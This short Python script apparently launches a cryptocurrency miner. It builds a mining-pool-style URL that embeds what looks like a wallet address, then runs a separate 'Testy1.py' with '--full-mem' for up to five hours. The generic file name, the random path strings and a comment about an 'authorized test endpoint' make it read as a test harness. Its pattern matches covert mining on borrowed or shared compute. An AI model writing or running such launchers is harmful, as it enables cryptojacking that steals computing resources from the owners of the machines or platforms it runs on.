
import random
import string
import subprocess
import os

chars = string.ascii_letters + string.digits

ss = ''.join(random.choices(chars, k=10))
xx = ''.join(random.choices(chars, k=10))

api_base = "https://pooltest.de2.netrun.io/"

if not api_base:
    raise RuntimeError("Set API_BASE to your authorized test endpoint.")

api = f"{api_base.rstrip('/')}/{ss}/43A5jC4mPkP6FLtqQtfWn7QjyDnZzWo6abq9a3TqCXe5j2585CHAoxTjRmPyW2dvjbURaqEwoaU9wZ5v312jt3agP1wHky8/{xx}"

result = subprocess.run(
        [
            "python",
            "Testy1.py",
            "--api",
            api,
            "--full-mem",
        ],
        timeout=5 * 60 * 60,
        check=True,
    )
